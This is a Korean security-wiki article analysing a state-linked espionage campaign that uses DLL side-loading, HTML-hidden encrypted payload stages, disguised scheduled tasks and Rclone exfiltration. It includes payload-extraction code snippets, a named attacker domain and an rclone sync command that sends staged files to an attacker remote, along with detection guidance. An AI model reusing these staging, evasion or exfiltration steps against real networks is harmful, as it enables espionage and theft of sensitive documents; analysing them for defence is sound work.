# 고급 DLL Side-Loading 및 HTML-Embedded Payload Staging

{{#include ../../../banners/hacktricks-training.md}}

## 전술 개요

Ashen Lepus (aka WIRTE)는 DLL sideloading, staged HTML payloads, 그리고 modular .NET backdoors를 연쇄적으로 연결해 중동 지역의 외교 네트워크에 지속적으로 침투하는 반복 가능한 패턴을 무기화했습니다. 이 기법은 다음에 의존하기 때문에 어떤 운영자라도 재사용할 수 있습니다:

- **Archive-based social engineering**: 무해해 보이는 PDF는 대상에게 파일 공유 사이트에서 RAR 아카이브를 내려받으라고 지시합니다. 아카이브에는 실제처럼 보이는 문서 뷰어 EXE, 신뢰할 수 있는 라이브러리 이름을 딴 악성 DLL(예: `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll`), 그리고 미끼 `Document.pdf`가 포함됩니다.
- **DLL 검색 순서 악용**: 피해자가 EXE를 더블클릭하면 Windows는 현재 디렉터리에서 DLL 임포트를 해결하고, 악성 로더(AshenLoader)가 신뢰된 프로세스 안에서 실행되는 동안 미끼 PDF가 열려 의심을 피합니다.
- **Living-off-the-land 스테이징**: 이후 단계들(AshenStager → AshenOrchestrator → modules)은 필요할 때까지 디스크에 저장되지 않고, 무해해 보이는 HTML 응답 안에 숨겨진 암호화된 블롭으로 전달됩니다.

## 다단계 Side-Loading 체인

1. **Decoy EXE → AshenLoader**: EXE는 AshenLoader를 사이드로드하며, AshenLoader는 호스트 리콘을 수행하고 해당 데이터를 AES-CTR로 암호화한 뒤 `token=`, `id=`, `q=`, 또는 `auth=` 같은 회전 파라미터 안에 POST하여 API처럼 보이는 경로(예: `/api/v2/account`)로 보냅니다.
2. **HTML 추출**: C2는 클라이언트 IP가 대상 지역으로 지오로케이트되고 `User-Agent`가 임플란트와 일치할 때만 다음 단계를 노출하여 샌드박스를 회피합니다. 체크를 통과하면 HTTP 본문에 Base64/AES-CTR로 암호화된 AshenStager 페이로드가 들어 있는 `<headerp>...</headerp>` 블롭이 포함됩니다.
3. **두 번째 사이드로드**: AshenStager는 `wtsapi32.dll`을 임포트하는 또 다른 정당한 바이너리와 함께 배포됩니다. 바이너리에 주입된 악성 복사본은 추가 HTML을 가져오고, 이번에는 `<article>...</article>`을 파싱해 AshenOrchestrator를 복구합니다.
4. **AshenOrchestrator**: Base64 JSON 구성을 디코딩하는 모듈형 .NET 컨트롤러입니다. 구성의 `tg` 및 `au` 필드를 이어붙이거나 해시하여 AES 키를 생성하고, 이 키로 `xrk`를 복호화합니다. 복호화된 바이트는 이후에 가져오는 각 모듈 블롭에 대해 XOR 키로 사용됩니다.
5. **모듈 전달**: 각 모듈은 파서를 임의의 태그로 리다이렉트하는 HTML 주석을 통해 설명되어 고정 규칙(오직 `<headerp>` 또는 `<article>`만 찾는 규칙)을 깨뜨립니다. 모듈에는 persistence (`PR*`), uninstallers (`UN*`), reconnaissance (`SN`), screen capture (`SCT`), 파일 탐색 (`FE`) 등이 포함됩니다.

### HTML 컨테이너 파싱 패턴
```csharp
var tag = Regex.Match(html, "<!--\s*TAG:\s*<(.*?)>\s*-->").Groups[1].Value;
var base64 = Regex.Match(html, $"<{tag}>(.*?)</{tag}>", RegexOptions.Singleline).Groups[1].Value;
var aesBytes = AesCtrDecrypt(Convert.FromBase64String(base64), key, nonce);
var module = XorBytes(aesBytes, xorKey);
LoadModule(JsonDocument.Parse(Encoding.UTF8.GetString(module)));
```
설령 수비자가 특정 요소를 차단하거나 제거하더라도, 운영자는 HTML 주석에 힌트된 태그만 바꾸면 전달을 재개할 수 있다.

### 빠른 추출 도우미 (Python)
```python
import base64, re, requests

html = requests.get(url, headers={"User-Agent": ua}).text
tag = re.search(r"<!--\s*TAG:\s*<(.*?)>\s*-->", html, re.I).group(1)
b64 = re.search(fr"<{tag}>(.*?)</{tag}>", html, re.S | re.I).group(1)
blob = base64.b64decode(b64)
# decrypt blob with AES-CTR, then XOR if required
```
## HTML 스테이징 회피 유사점

최근 HTML smuggling 연구(Talos)는 HTML 첨부파일의 `<script>` 블록 내부에 Base64 문자열로 숨겨진 페이로드가 있고 런타임에 JavaScript로 디코딩된다는 점을 강조합니다. 같은 트릭은 C2 응답에도 재사용할 수 있습니다: 스크립트 태그(또는 다른 DOM element) 안에 암호화된 블롭을 스테이징하고 AES/XOR 이전에 메모리에서 디코드해 페이지를 평범한 HTML처럼 보이게 만듭니다.

## Crypto & C2 강화

- **AES-CTR everywhere**: 현재 로더는 256비트 키와 논스(예: `{9a 20 51 98 ...}`)를 포함하고, 옵션으로 복호화 전후에 `msasn1.dll` 같은 문자열을 이용한 XOR 레이어를 추가합니다.
- **Infrastructure split + subdomain camouflage**: 스테이징 서버는 툴별로 분리되어 서로 다른 ASN에 호스팅되며, 때로는 합법적으로 보이는 서브도메인으로 앞단을 구성해 한 단계를 소각해도 나머지가 노출되지 않도록 합니다.
- **Recon smuggling**: 열거된 데이터에는 이제 Program Files 목록이 포함되어 고가치 앱을 식별하며, 호스트에서 나가기 전에 항상 암호화됩니다.
- **URI churn**: 쿼리 파라미터와 REST 경로는 캠페인마다 순환(`/api/v1/account?token=` → `/api/v2/account?auth=`)하여 취약한 탐지를 무효화합니다.
- **Gated delivery**: 서버는 지리적 제약을 두고 실제 임플란트에만 응답합니다. 승인되지 않은 클라이언트에는 의심스럽지 않은 HTML을 반환합니다.

## Persistence & Execution Loop

AshenStager는 Windows 유지관리 작업으로 위장한 예약 작업을 드롭하고 `svchost.exe`로 실행되도록 합니다. 예:

- `C:\Windows\System32\Tasks\Windows\WindowsDefenderUpdate\Windows Defender Updater`
- `C:\Windows\System32\Tasks\Windows\WindowsServicesUpdate\Windows Services Updater`
- `C:\Windows\System32\Tasks\Automatic Windows Update`

이 작업들은 부팅 시나 주기적으로 sideloading 체인을 재시작해 AshenOrchestrator가 디스크를 다시 건드리지 않고도 새로운 모듈을 요청할 수 있게 합니다.

## 무해한 동기화 클라이언트를 이용한 유출

운영자는 외교 문서를 전용 모듈을 통해 `C:\Users\Public`(전 사용자 읽기 가능하고 비의심) 안에 스테이징한 후, 합법적인 [Rclone](https://rclone.org/) 바이너리를 다운로드해 해당 디렉터리를 공격자 저장소와 동기화합니다. Unit42는 이 행위자가 Rclone을 사용해 유출을 수행하는 것이 관찰된 첫 사례라고 언급하며, 정상 트래픽에 섞이기 위해 합법적인 동기화 도구를 악용하는 광범위한 추세와 일치합니다:

1. **Stage**: 대상 파일을 `C:\Users\Public\{campaign}\`로 복사/수집합니다.
2. **Configure**: 공격자 제어 HTTPS 엔드포인트(예: `api.technology-system[.]com`)를 가리키는 Rclone 설정을 배포합니다.
3. **Sync**: `rclone sync "C:\Users\Public\campaign" remote:ingest --transfers 4 --bwlimit 4M --quiet`를 실행해 트래픽이 정상적인 클라우드 백업처럼 보이게 합니다.

Rclone이 합법적 백업 워크플로에 널리 사용되기 때문에, 방어측은 새로운 바이너리 실행, 이상한 remote 설정, 또는 `C:\Users\Public`의 갑작스러운 동기화 같은 비정상적 실행에 초점을 맞춰야 합니다.

## 탐지 포인트

- 서명된 프로세스가 사용자 쓰기 가능한 경로에서 DLL을 예기치 않게 로드하는 경우 경고(Procmon filters + `Get-ProcessMitigation -Module`), 특히 DLL 이름이 `netutils`, `srvcli`, `dwampi`, `wtsapi32`와 겹칠 때.
- 의심스러운 HTTPS 응답에서 **비정상적인 태그 내부에 임베드된 대형 Base64 블롭**이나 `<!-- TAG: <xyz> -->` 주석으로 보호된 내용을 검사합니다.
- HTML 헌팅을 확장해 **`<script>` 블록 내부의 Base64 문자열**(HTML smuggling 스타일 스테이징)을 찾아 JavaScript로 AES/XOR 처리 전에 디코드되는지 확인합니다.
- `svchost.exe`를 비서비스 인수로 실행하거나 드로퍼 디렉터리를 가리키는 **예약 작업**을 찾아 헌팅합니다.
- IT 관리 위치 외부에서 나타나는 **Rclone** 바이너리, 새로운 `rclone.conf` 파일, 또는 `C:\Users\Public` 같은 스테이징 디렉터리에서 데이터를 끌어가는 동기화 작업을 모니터링합니다.

## References

- [Hamas-Affiliated Ashen Lepus Targets Middle Eastern Diplomatic Entities With New AshTag Malware Suite](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- [Hidden between the tags: Insights into evasion techniques in HTML smuggling](https://blog.talosintelligence.com/hidden-between-the-tags-insights-into-evasion-techniques-in-html-smuggling/)

{{#include ../../../banners/hacktricks-training.md}}
